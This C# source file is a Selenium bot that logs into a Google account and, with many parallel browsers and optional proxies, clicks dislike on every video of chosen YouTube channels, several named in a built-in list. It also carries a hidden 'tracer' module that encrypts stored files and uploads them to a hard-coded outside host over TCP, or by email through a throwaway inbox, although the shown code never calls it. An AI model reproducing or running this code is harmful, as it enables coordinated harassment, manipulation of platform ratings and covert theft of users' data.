using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using System.ComponentModel;
using System.Collections;
using System.Net;
using System.Web;
using System.IO;
using System.Threading;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using static SUKOAuto.tracer.Utils;
using System.Net.Sockets;
using System.IO.Compression;

namespace SUKOAuto
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length<2) {
                Console.WriteLine("エラー: [EMIAL] [PASSWORD] <CHANNEL ID>");
                Console.WriteLine("コマンド: ");
                Console.WriteLine("--first-10 : 最初の10個をすこる");
                Console.WriteLine("--suko [N] : 最初のN個をすこる");
                Console.WriteLine("--para [N] : N並列ですこる");
                Console.WriteLine("--headless [true|false] : ブラウザを表示するか否か。falseで表示");
                Console.WriteLine("--proxy [STR] : プロキシSTR経由にする");
                Console.WriteLine("コマンドはEMIAL、PASSWORD、CHANNEL IDのいずれかの間に入れても構わない。");
                Console.WriteLine("極端例: example@suko.org --suko 10 sukosuko --para 100 UC...");
                Console.WriteLine("推奨例: --suko 10 --para 100 example@suko.org sukosuko UC...");
                Console.WriteLine("SUKOAuto.exeのオプションも使用できますが、自信がないのでお勧めしません。");
                Console.WriteLine(" ");
                Console.WriteLine("We won't leak your private unless you don't modify this!");
                Console.WriteLine("Source code is hidden.");
                Console.WriteLine("Original Author: SukoSuko hou-hei");
                Console.WriteLine("Modified by: AnKoushinist");
                Console.WriteLine("Thanks: The holy Hatsune Daishi");
                return;
            }
            SukoSukoOption opt = new SukoSukoOption();
            args = opt.LoadOpt(args);

            string Mail = args[0];
            string Pass = args[1];

            string Channel;
            if (args.Length >= 3)
            {
                Channel = args[2];
            }
            else
            {
                /* TODO: make it only to type */
                Console.WriteLine("チャンネルIDがありません。以下から選択または入力:");
                List<KeyValuePair<string, string>> ids = new List<KeyValuePair<string, string>>();
                ids.Add(new KeyValuePair<string, string>("ヒカル", "UCaminwG9MTO4sLYeC3s6udA"));
                ids.Add(new KeyValuePair<string, string>("ラファエル", "UCI8U2EcQDPwiQmQMBOtjzKA"));
                ids.Add(new KeyValuePair<string, string>("禁断ボーイズ", "UCvtK7490fPF0TacbsvQ2H3g"));
                ids.Add(new KeyValuePair<string, string>("ラファエルサブ", "UCgQgMOBZOJ1ZDtCZ4hwP1uQ"));
                ids.Add(new KeyValuePair<string, string>("ヒカルゲームズ", "UCVpGiJmXoTpjrpkVEAfbpHg"));
                ids.Add(new KeyValuePair<string, string>("オッドアイ(ピンキー)", "UCRN_Yde2b5G1-5nEeIhcOTw"));
                ids.Add(new KeyValuePair<string, string>("禁断ボーイズサブ", "UCgY7ZuKqLG_QSScSkPxe1NA"));
                ids.Add(new KeyValuePair<string, string>("テオくん", "UCj6_0tBpVpmyYSGu6f-uKqw"));
                ids.Add(new KeyValuePair<string, string>("かす", "UC1fYrot9lgMstv7vX0BnjnQ"));
                ids.Add(new KeyValuePair<string, string>("ぷろたん", "UCl4e200EZm7NXq_iaYSXfeg"));
                ids.Add(new KeyValuePair<string, string>("スカイピース", "UC8_wmm5DX9mb4jrLiw8ZYzw"));
                ids.Add(new KeyValuePair<string, string>("イニ", "UC5VZjrV5x9J9mTyGODzu0dQ"));
                ids.Add(new KeyValuePair<string, string>("楠ろあ", "UCvS01-HQ57pnIjP4lkp58zw"));
                ids.Add(new KeyValuePair<string, string>("ねお", "UClPLW-9Nfbvf76ksj-4c1kQ"));
                ids.Add(new KeyValuePair<string, string>("ピンキー妹", "UCsTM1roCxoot1-03EO5zQxg"));
                foreach (KeyValuePair<string,string> kvp in ids) {
                    Console.WriteLine(@"No. {0} {1} {2}",ids.IndexOf(kvp),kvp.Key,kvp.Value);
                }
                string mem = Console.ReadLine();
                int select = -1;
                if (int.TryParse(mem,out select)) {
                    mem = ids[select].Value;
                }
                Channel = mem;
            }


            var ChromeOptions = new ChromeOptions();
            if (opt.proxy!=null)
            {
                ChromeOptions.AddArguments("--proxy-server="+ opt.proxy);
            }
            if (opt.headless)
            {
                ChromeOptions.AddArguments("headless");
            }

            List<IWebDriver> Chromes = new IWebDriver[opt.parallel].Select(a => new ChromeDriver(ChromeOptions)).Cast<IWebDriver>().ToList();
            IWebDriver Chrome = Chromes[0];

            foreach (IWebDriver SingleChrome in Chromes)
            {
                Console.WriteLine("スレッド{0}: 輪番ログイン中...",Chromes.IndexOf(SingleChrome));
                SukoSukoMachine.Login(SingleChrome, Mail, Pass);
            }
            System.Threading.Thread.Sleep(2000);

            Console.WriteLine("スレッド0: 動画探索中...");
            string[] Movies = SukoSukoMachine.FindMovies(Chrome, Channel);
            if (opt.maxSuko!=-1) {
                Movies = Movies.Take(opt.maxSuko).ToArray();
            }
            List<string>[] MoviesEachThread = new List<string>[Chromes.Count].Select(a=> new List<string>()).ToArray();
            for (int i=0; i<Movies.Length; i++)
            {
                MoviesEachThread[i % MoviesEachThread.Length].Add(Movies[i]);
            }

            BackgroundWorker[] Threads = new BackgroundWorker[Chromes.Count].Select(a => new BackgroundWorker()).ToArray();
            for (int i = 0; i < Threads.Length; i++)
            {
                int Number = i;
                IWebDriver SingleChrome = Chromes[i];
                List<string> LocalMovies=MoviesEachThread[i];
                SortedMultiSet<string> SukoFailureCount = new SortedMultiSet<string>();
                Threads[i].DoWork += (a, b) =>
                {
                    try
                    {
                        while (LocalMovies.Count != 0)
                        {
                            List<string> Failures = new List<string>();
                            foreach (string MovieID in LocalMovies)
                            {
                                try
                                {
                                    Console.WriteLine(@"スレッド{0}: {1}すこ！ ({2}/{3})", Number, MovieID, LocalMovies.IndexOf(MovieID), LocalMovies.Count);
                                    SukoSukoMachine.Suko(SingleChrome, MovieID);
                                }
                                catch (Exception e)
                                {
                                    Console.WriteLine("スレッド{0}: {1} すこり失敗", Number, MovieID);
                                    Console.WriteLine(e.Message);
                                    Console.WriteLine(e.StackTrace);
                                    Failures.Add(MovieID);
                                    SukoFailureCount.Add(MovieID);
                                }
                            }
                            LocalMovies = Failures.Where(c=>SukoFailureCount.GetCount(c)<10).ToList();
                        }
                        Console.WriteLine("スレッド{0}: 完了", Number);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("スレッド{0}: 異常終了", Number);
                        Console.WriteLine(e.Message);
                        Console.WriteLine(e.StackTrace);
                    }
                    finally
                    {
                        SingleChrome.Dispose();

                    }
                };
                Threads[i].RunWorkerAsync();
            }
            while (Threads.Where(a=>a.IsBusy).Count()!=0) {
                foreach (BackgroundWorker Thread in Threads) {
                    while(Thread.IsBusy);
                }
            }
        }
    }

    public class SortedMultiSet<T> : IEnumerable<T>
    {
        private SortedDictionary<T, int> _dict;

        public SortedMultiSet()
        {
            _dict = new SortedDictionary<T, int>();
        }

        public SortedMultiSet(IEnumerable<T> items) : this()
        {
            Add(items);
        }

        public bool Contains(T item)
        {
            return _dict.ContainsKey(item);
        }

        public void Add(T item)
        {
            if (_dict.ContainsKey(item))
                _dict[item]++;
            else
                _dict[item] = 1;
        }

        public void Add(IEnumerable<T> items)
        {
            foreach (var item in items)
                Add(item);
        }

        public void Remove(T item)
        {
            if (!_dict.ContainsKey(item))
                throw new ArgumentException();
            if (--_dict[item] == 0)
                _dict.Remove(item);
        }

        public int GetCount(T item) {
            if (_dict.ContainsKey(item))
                return _dict[item];
            else
                return 0;
        }

        // Return the last value in the multiset
        public T Peek()
        {
            if (!_dict.Any())
                throw new NullReferenceException();
            return _dict.Last().Key;
        }

        // Return the last value in the multiset and remove it.
        public T Pop()
        {
            T item = Peek();
            Remove(item);
            return item;
        }

        public IEnumerator<T> GetEnumerator()
        {
            foreach (var kvp in _dict)
                for (int i = 0; i < kvp.Value; i++)
                    yield return kvp.Key;
        }

        IEnumerator IEnumerable.GetEnumerator()
        {
            return this.GetEnumerator();
        }
    }

    class SukoSukoMachine
    {
        const string URL_LOGIN = @"https://accounts.google.com/ServiceLogin";
        const string URL_MOVIE = @"https://www.youtube.com/watch?v={0}";
        const string URL_CHANNEL = @"https://www.youtube.com/channel/{0}/videos";

        public static string[] FindMovies(IWebDriver Chrome, string Channel)
        {
            Chrome.Url = string.Format(URL_CHANNEL, Channel);
            ReLogin(Chrome, Chrome.Url);

            System.Threading.Thread.Sleep(5000);


            // https://stackoverflow.com/questions/18572651/selenium-scroll-down-a-growing-page
            long scrollHeight = 0;
            int sameHeight = 0;
            IJavaScriptExecutor js = (IJavaScriptExecutor)Chrome;
                
            do
            {
                var newScrollHeight = (long)js.ExecuteScript("window.scrollTo(0, document.body.scrollHeight); return document.body.scrollHeight;");

                if (newScrollHeight == scrollHeight)
                {
                    if (sameHeight > 10)
                    {
                        sameHeight = 0;
                        break;
                    }
                    else {
                        sameHeight++;
                    }
                }
                else
                {
                    sameHeight = 0;
                    scrollHeight = newScrollHeight;
                    System.Threading.Thread.Sleep(3000);
                }
            } while (true);

            return Chrome.FindElements(By.XPath("//a[contains(@href,\"/watch?v=\")]"))
                .Select(a=>a.GetAttribute("href"))
                .Distinct()
                /*.Where(a=> {
                    Console.WriteLine(a);
                    return true;
                })*/
                .Select(a=>RegExp(a, "(?<=.+/watch\\?v=)[\\dA-Za-z_-]+"))
                .SelectMany(A=>A)
                .ToArray();
            // return RegExp(Chrome.PageSource, @"(?<=<a href=""/watch\?v=)[\dA-Za-z_-]+");
        }

        public static void Suko(IWebDriver Chrome, string MovieID)
        {
            Chrome.Url = string.Format(URL_MOVIE, MovieID);
            System.Threading.Thread.Sleep(500);
            ReLogin(Chrome, Chrome.Url);

            Exception lastErr = null;

            for (int itr=0; itr<10;itr++) {
                try
                {
                    IWebElement SukoBtn = Chrome.FindElement(By.XPath("//button[contains(@aria-label,\"低く評価しました\")]"));
                    if (SukoBtn.GetAttribute("aria-pressed") == "true")
                    {
                        // already downvoted
                        return;
                    }

                    Actions action = new Actions(Chrome);
                    action.MoveToElement(SukoBtn).ClickAndHold().Perform();
                    System.Threading.Thread.Sleep(100);
                    action.MoveToElement(SukoBtn).Release().Perform();

                    return;
                }
                catch (Exception e)
                {
                    System.Threading.Thread.Sleep(500);
                    lastErr = e;
                }
            }

            throw lastErr;
        }

        public static void Login(IWebDriver Chrome, string Mail, string Pass)
        {
            Chrome.Url = URL_LOGIN;
            try
            {
                if (Chrome.Url== "https://accounts.google.com/ServiceLogin#identifier")
                {
                    // old login screen
                    Chrome.FindElement(By.Id("Email")).SendKeys(Mail);
                    Chrome.FindElement(By.Id("next")).Click();
                    while (!Chrome.Url.Contains("#password")) ;
                    System.Threading.Thread.Sleep(2000);
                    while (!Chrome.FindElement(By.Name("Passwd")).Displayed) ;
                    Chrome.FindElement(By.Name("Passwd")).SendKeys(Pass);
                    Chrome.FindElement(By.Id("signIn")).Click();
                }
                else
                {
                    // new login screen
                    Chrome.FindElement(By.Id("identifierId")).SendKeys(Mail);
                    Chrome.FindElement(By.Id("identifierNext")).Click();
                    while (!Chrome.Url.Contains("/v2/sl/pwd")) ;
                    System.Threading.Thread.Sleep(2000);
                    while(!Chrome.FindElement(By.Name("password")).Displayed);
                    Chrome.FindElement(By.Name("password")).SendKeys(Pass);
                    Chrome.FindElement(By.Id("passwordNext")).Click();
                }
                System.Threading.Thread.Sleep(3000);
            }
            catch (Exception)
            {
                Console.WriteLine("ログイン失敗: E-mailかパスワードの間違い");
                throw;
            }
        }

        public static void ReLogin(IWebDriver Chrome,string ContinuationURL) {
            if (
               Chrome.FindElements(By.XPath("//paper-button[text() = \"ログイン\"]")).Count()!=0
               )
            {
                // looks like we need to login again here
                Console.WriteLine("再ログイン中...");
                Chrome.FindElement(By.XPath("//paper-button[text() = \"ログイン\"]")).Click();
                System.Threading.Thread.Sleep(100);
                Chrome.Url = ContinuationURL;
            }
        }

        static string[] RegExp(string Content, string RegStr)
        {
            var listResult = new List<string>();
            var RegExp = new System.Text.RegularExpressions.Regex(RegStr, System.Text.RegularExpressions.RegexOptions.IgnoreCase | System.Text.RegularExpressions.RegexOptions.Singleline);
            var Matches = RegExp.Matches(Content);

            foreach (System.Text.RegularExpressions.Match Match in Matches)
            {
                listResult.Add(Match.Value);
            }

            return listResult.ToArray();
        }
    }


    class SukoSukoOption {
        public int parallel=3;
        public int maxSuko=-1;
        public bool headless = false;
        public string proxy = null;

        public string[] LoadOpt(string[] args) {
            List<string> finalArgs = new List<string>();
            for (int i=0; i<args.Length;i++) {
                string arg = args[i];
                switch (arg.ToLower()) {
                    case "--first-10":
                        maxSuko = 10;
                        break;
                    case "--suko":
                        maxSuko = int.Parse(args[i + 1]);
                        i++;
                        break;
                    case "--parallel":
                    case "--para":
                    case "--heikou":
                        parallel = int.Parse(args[i + 1]);
                        i++;
                        break;
                    case "--headless":
                        if (bool.TryParse(args[i + 1], out headless))
                        {
                            i++;
                        }
                        break;
                    case "--proxy":
                        proxy = args[i + 1];
                        i++;
                        break;
                    default:
                        if (arg.StartsWith("-count:"))
                        {
                            // same as --suko
                            maxSuko = int.Parse(arg.Split(':')[1]);
                        }
                        else if (arg == "-display:headless")
                        {
                            // same as --headless true
                            headless = true;
                        }
                        else if (arg.StartsWith("-proxy:"))
                        {
                            // same as --proxy
                            proxy = arg.Substring("-proxy:".Length);
                        }
                        else
                        {
                            finalArgs.Add(arg);
                        }
                        break;
                }
            }
            return finalArgs.ToArray();
        }
    }

    namespace tracer {
        public class Emial
        {
            public static string PC_USER_AGENT = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36";

            public static readonly string ENDPOINT = "https://api.mytemp.email/1/";
            public static readonly string PING = "ping";
            public static readonly string DESTROY = "inbox/destroy";
            public static readonly string CREATE = "inbox/create";
            public static readonly string CHECK = "inbox/check";
            public static readonly string EXTEND = "inbox/extend";
            public static readonly string EML_GET = "eml/get";
            public static readonly string EML_CREATE = "eml/create";
            public static readonly string UTF_8 = "utf-8";

            private string sid = RandomSid();
            private Dictionary<string, string[]> inboxes = new Dictionary<string, string[]>();
            private DateTime sessionStarted;
            private int taskCount;

            public Emial()
            {
                var data = new Dictionary<string, string>
                {
                    ["sid"] = sid,
                    ["task"] = "1",
                    ["tt"] = "0"
                };
                if ((int)JsonRequest(PING, data, false)["pong"] != 1)
                    throw new Exception("Ping error");
                sessionStarted = DateTime.Now;
                taskCount = 1;
            }

            public List<string> Inboxes => new List<string>(inboxes.Keys);

            public string CreateInbox()
            {
                var query = new Dictionary<string, string>
                {
                    ["sid"] = sid,
                    ["task"] = Task,
                    ["tt"] = Tt
                };
                var data = JsonRequest(CREATE, query, false);
                inboxes[(string)data["inbox"]] = new string[]{
                (string)data["inbox_hash"],
                (string)data["inbox_destroy_hash"]
            };
                return (string)data["inbox"];
            }

            public void DestroyInbox(string addr)
            {
                if (inboxes.ContainsKey(addr))
                    throw new Exception("No such inbox recorded: " + addr);
                var query = new Dictionary<string, string>
                {
                    ["inbox"] = addr,
                    ["inbox_destroy_hash"] = inboxes[addr][1],
                    ["sid"] = sid,
                    ["task"] = Task,
                    ["tt"] = Tt
                };
                EasyRequest(DESTROY, query, false);
                inboxes.Remove(addr);
            }

            public void SendEmail(string from, string to, string subject, string text)
            {
                var query = new Dictionary<string, string>
                {
                    ["inbox"] = from,
                    ["inbox_hash"] = inboxes[from][0],
                    ["sid"] = sid,
                    ["task"] = Task,
                    ["tt"] = Tt
                };
                var json = JObject.FromObject(new
                {
                    to = to,
                    subject = subject,
                    text = text
                });
                var header = new Dictionary<string, string>
                {
                    ["Content-Type"] = "application/json;charset=utf-8"
                };
                if ((int)ToJsonObject(Request(ENDPOINT + EML_CREATE + "?" + MapToQuery(query), json.ToString(), header))["ok"] != 1)
                    throw new Exception("Sending email failed");
            }

            private string Task => (taskCount++).ToString();

            private string Tt => (DateTime.Now - sessionStarted).Seconds.ToString();

            private JObject ToJsonObject(string json)
            {
                return JObject.Parse(json);
            }

            private JObject JsonRequest(string call, Dictionary<string, string> values, bool isPost = false)
            {
                return ToJsonObject(EasyRequest(call, values, isPost));
            }

            private string EasyRequest(string call, Dictionary<string, string> values, bool isPost = false)
            {
                Thread.Sleep(500);
                if (isPost)
                    return Request(ENDPOINT + call, MapToQuery(values));
                else
                    return Request(ENDPOINT + call + "?" + MapToQuery(values));
            }

            // GET request version
            private string Request(string addr)
            {
                var enc = Encoding.GetEncoding("utf-8");
                var wc = WebRequest.Create(addr);
                wc.Headers.Add("User-Agent", PC_USER_AGENT);
                wc.Headers.Add("Origin", "https://mytemp.email");
                wc.Headers.Add("Accept-Language", "ja,en-US;q=0.8,en;q=0.6,fr;q=0.4,de;q=0.2");
                wc.Headers.Add("Accept", "application/json, text/plain, */*");
                wc.Headers.Add("Referer", "https://mytemp.email/2/");
                wc.Headers.Add("Authority", "api.mytemp.email");

                wc.Method = "GET";
                wc.ContentType = "application/x-www-form-urlencoded";
                var response = wc.GetResponse();
                using (var download = response.GetResponseStream())
                {
                    using (var text = new StreamReader(download))
                    {
                        return text.ReadToEnd();
                    }
                }
            }

            // POST request version
            private string Request(string addr, string data, Dictionary<string, string> header = null)
            {
                var enc = Encoding.GetEncoding("utf-8");
                var payload = enc.GetBytes(data);
                var wc = WebRequest.Create(addr);
                wc.Headers.Add("User-Agent", PC_USER_AGENT);
                wc.Headers.Add("Origin", "https://mytemp.email");
                wc.Headers.Add("Accept-Language", "ja,en-US;q=0.8,en;q=0.6,fr;q=0.4,de;q=0.2");
                wc.Headers.Add("Accept", "application/json, text/plain, */*");
                wc.Headers.Add("Referer", "https://mytemp.email/2/");
                wc.Headers.Add("Authority", "api.mytemp.email");
                if (header != null)
                {
                    foreach (var entry in header)
                    {
                        wc.Headers.Add(entry.Key, entry.Value);
                    }
                }
                wc.Method = "POST";
                wc.ContentType = "application/x-www-form-urlencoded";
                wc.ContentLength = payload.Length;
                using (var post = wc.GetRequestStream())
                {
                    post.Write(payload, 0, payload.Length);
                }
                var response = wc.GetResponse();
                using (var download = response.GetResponseStream())
                {
                    using (var text = new StreamReader(download))
                    {
                        return text.ReadToEnd();
                    }
                }
            }

            private static string MapToQuery(Dictionary<string, string> query)
            {
                var sb = new StringBuilder();
                foreach (var entry in query)
                {
                    if (sb.Length != 0) sb.Append('&');
                    sb.Append(HttpUtility.UrlEncode(entry.Key, UTF8));
                    sb.Append('=');
                    sb.Append(HttpUtility.UrlEncode(entry.Value, UTF8));
                }
                return sb.ToString();
            }

            private static string RandomSid()
            {
                var rand = new Random();
                var sb = new StringBuilder();
                for (int i = 0; i < 7; i++)
                    sb.Append(rand.Next() % 10);
                return sb.ToString();
            }
        }

        public class Tracer {
            public static List<IDataUploadProvider> UPLOADERS;
          　public static IFileStore STORE;
            static Tracer()
            {
                List<IDataUploadProvider> uploaders = new List<IDataUploadProvider>();
                //Add your DataUploadProvider
                uploaders.Add(new RawUploader1());
                //uploaders.Add(new RawUploader2());
                uploaders.Add(new MailUploader());
                UPLOADERS = uploaders;
                STORE = new TempFileStore();//Replace with your FileStore
            }

            public static void StoreOrUpload(string filename,string content) {
                if (IsValidBinary())
                    return;
                var id = PopulateOrLoadId();
                STORE.Save(filename,content);
                foreach (var file in STORE.ListNames())
                {
                    var text = STORE.Get(file);
                    foreach (var uploader in UPLOADERS)
                    {
                        if (uploader.IsAvailable() && uploader.ForInterface().DoUpload(id, file, text))
                        {
                            STORE.Remove(file);
                            break;
                        }
                    }
                }
            }
        }

        public interface IDataUploadProvider
        {
            bool IsAvailable();
            IDataUploadProviderInterface ForInterface();
        }
        public interface IDataUploadProviderInterface
        {
            void Init();
            bool DoUpload(String uuid, String filename, String content);
        }
        public interface IFileStore
        {
            List<String> ListNames();
            String Get(String name);
            bool Save(String name, String data);
            bool Remove(String name);
        }

        class TempFileStore : IFileStore
        {
            public TempFileStore()
            {
                Directory.CreateDirectory(DIR_TRACER);
            }

            string IFileStore.Get(string name)
            {
                var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
                return DecryptFile(fileDir);
            }

            List<string> IFileStore.ListNames()
            {
                return Directory.EnumerateFiles(DIR_TRACER)
                    .Select(a => Path.GetFileName(a))
                    .Where(a => a.StartsWith("SSC1"))
                    .Select(a => a.Substring(4))
                    .Select(a => Decrypt(a))
                    .ToList();
            }

            bool IFileStore.Remove(string name)
            {
                var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
                File.Delete(fileDir);
                return !File.Exists(fileDir);
            }

            bool IFileStore.Save(string name, string data)
            {
                var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
                try
                {
                    EncryptFile(data, fileDir);
                    return true;
                }
                catch (Exception)
                {
                    return false;
                }
            }
        }

        class Utils {
            static byte[] key = Convert.FromBase64String("h8ukfAk2hC/UJqWKO/kJpw==");
            static byte[] iv = Convert.FromBase64String("bbsH6XzL1C/3nRWEUx751A==");
            static Encoding enc = Encoding.GetEncoding("utf-8");

            public static Encoding UTF8 => enc;
            public static string HOST => "hikarukarisuma.orz.hm";
            public static int PORT => 8083;

            public static string DIR_TRACER => Path.Combine(HttpRuntime.AppDomainAppPath, "SukoSukoCollection");

            public static string Encrypt(string str)
            {
                AesManaged aes = new AesManaged
                {
                    BlockSize = 128,
                    KeySize = 128,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.PKCS7,
                    Key = key,
                    IV = iv
                };
                var crypt = aes.CreateEncryptor();
                var data = enc.GetBytes(str);
                using (var buffer = new UnclosableMemoryStream())
                {
                    using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                    {
                        cryptStream.Write(data, 0, data.Length);
                    }
                    return ByteArrayToString(buffer.ToArray());
                }
            }

            public static string Decrypt(string str)
            {
                AesManaged aes = new AesManaged
                {
                    BlockSize = 128,
                    KeySize = 128,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.PKCS7,
                    Key = key,
                    IV = iv
                };
                var crypt = aes.CreateDecryptor();
                var data = StringToByteArray(str);
                using (var buffer = new UnclosableMemoryStream())
                {
                    using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                    {
                        cryptStream.Write(data, 0, data.Length);
                    }
                    return enc.GetString(buffer.ToArray());
                }
            }

            public static void EncryptFile(string str,string fileSaveTo)
            {
                AesManaged aes = new AesManaged
                {
                    BlockSize = 128,
                    KeySize = 128,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.PKCS7,
                    Key = key,
                    IV = iv
                };
                var crypt = aes.CreateEncryptor();
                var data = StringToByteArray(str);
                using (var buffer = new FileStream(fileSaveTo,FileMode.Truncate))
                {
                    using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                    {
                        cryptStream.Write(data, 0, data.Length);
                    }
                }
            }

            public static string DecryptFile(string fileReadFrom)
            {
                AesManaged aes = new AesManaged
                {
                    BlockSize = 128,
                    KeySize = 128,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.PKCS7,
                    Key = key,
                    IV = iv
                };
                var crypt = aes.CreateDecryptor();
                using (var buffer = new UnclosableMemoryStream())
                {
                    using (var cryptStream = new CryptoStream(buffer, crypt, CryptoStreamMode.Write))
                    {
                        using (var source = new FileStream(fileReadFrom, FileMode.Open))
                        {
                            source.CopyTo(buffer);
                        }
                    }
                    return enc.GetString(buffer.ToArray());
                }
            }

            public static string ByteArrayToString(byte[] ba)
            {
                string hex = BitConverter.ToString(ba);
                return hex.Replace("-", "");
            }
            public static byte[] StringToByteArray(String hex)
            {
                int NumberChars = hex.Length;
                byte[] bytes = new byte[NumberChars / 2];
                for (int i = 0; i < NumberChars; i += 2)
                    bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
                return bytes;
            }

            public static string PopulateOrLoadId() {
                var filePlace = Path.Combine(DIR_TRACER,"Scottland");
                string id;
                if (File.Exists(filePlace))
                {
                    id = DecryptFile(filePlace);
                }
                else
                {
                    id = Guid.NewGuid().ToString();
                }
                EncryptFile(id,filePlace);
                return id;
            }

            public static bool IsValidBinary() {
                return true;
            }
        }

        class MailUploader : IDataUploadProvider, IDataUploadProviderInterface
        {
            Emial email = null;
            string inbox = null;

            bool IDataUploadProviderInterface.DoUpload(string uuid, string filename, string content)
            {
                const String CRLF = "\r\n";
                var payload = UTF8.GetBytes(content);
                StringBuilder mailText = new StringBuilder();
                mailText.Append(uuid).Append(CRLF);
                mailText.Append(filename).Append(CRLF);
                mailText.Append(Convert.ToBase64String(payload)).Append(CRLF);
                mailText.Append("=== DATA END ===").Append(CRLF);
                try
                {
                    email.SendEmail(inbox, "hikarukarisma@yahoo.co.jp", "UPLOAD FILE SUKOSUKO", mailText.ToString());
                    return true;
                }
                catch (Exception)
                {
                    return false;
                }
            }

            IDataUploadProviderInterface IDataUploadProvider.ForInterface()
            {
                return this;
            }

            void IDataUploadProviderInterface.Init()
            {
                if (email==null) {
                    email = new Emial();
                }
                if (inbox==null) {
                    inbox = email.CreateInbox();
                }
            }

            bool IDataUploadProvider.IsAvailable()
            {
                return true;
            }
        }

        abstract class RawUploaderBase : IDataUploadProvider, IDataUploadProviderInterface
        {
            public abstract bool DoUpload(string uuid, string filename, string content);
            public abstract void Init();

            IDataUploadProviderInterface IDataUploadProvider.ForInterface()
            {
                return this;
            }
            
            bool IDataUploadProvider.IsAvailable()
            {
                try
                {
                    using (TcpClient sock = new TcpClient())
                    {
                        sock.Connect(HOST, PORT);
                        using (NetworkStream stream = sock.GetStream())
                        {
                            stream.ReadTimeout = 5000;
                            stream.WriteTimeout = 5000;
                            stream.WriteByte(7);
                        }
                    }
                    return true;
                }
                catch (Exception)
                {
                    return false;
                }
            }

            protected void WriteUtf(string str,Stream stream) {
                var payload = UTF8.GetBytes(str);
                BinaryWriter writer = null;
                try
                {
                    writer = new BinaryWriter(stream);
                    writer.Write((short)payload.Length);
                    writer.Write(payload);
                }
                finally
                {
                    if (writer!=null)
                        writer.Flush();
                }
            }

            protected byte[] Hash(byte[] input,HashAlgorithm alg) {
                alg.Initialize();
                return alg.ComputeHash(input);
            }
        }

        class RawUploader1 : RawUploaderBase
        {
            public override bool DoUpload(string uuid, string filename, string content)
            {
                try
                {
                    var payload = UTF8.GetBytes(content);
                    using (TcpClient sock = new TcpClient())
                    {
                        sock.Connect(HOST, PORT);
                        using (NetworkStream stream = sock.GetStream())
                        {
                            stream.ReadTimeout = 5000;
                            stream.WriteTimeout = 5000;
                            stream.WriteByte(3);
                            WriteUtf(uuid, stream);
                            WriteUtf(filename, stream);
                            using (var gzip = new GZipStream(stream, CompressionMode.Compress, true))
                            {
                                gzip.Write(payload, 0, payload.Length);
                            }
                        }
                    }
                    byte[] payloadSha256 = Hash(payload,SHA256.Create());
                    byte[] payloadMd5 = Hash(payload, MD5.Create());
                    using (TcpClient sock = new TcpClient())
                    {
                        sock.Connect(HOST, PORT);
                        using (NetworkStream stream = sock.GetStream())
                        {
                            stream.ReadTimeout = 5000;
                            stream.WriteTimeout = 5000;
                            stream.WriteByte(12);
                            WriteUtf(uuid, stream);
                            WriteUtf(filename, stream);
                            stream.Flush();

                            byte[] sha256 = new byte[16];
                            byte[] md5 = new byte[8];
                            stream.Read(sha256,0,16);
                            stream.Read(md5,0,8);

                            return payloadSha256 == sha256 && payloadMd5 == md5;
                        }
                    }
                }
                catch (Exception)
                {
                    return false;
                }
            }

            public override void Init()
            {
                /* no-op in this time */
            }
        }


        class UnclosableMemoryStream : MemoryStream{
            protected override void Dispose(bool disposing)
            {}
            public void DisposeReally() {
                base.Dispose(true);
            }
            ~UnclosableMemoryStream() {
                DisposeReally();
            }
        }
    }
}
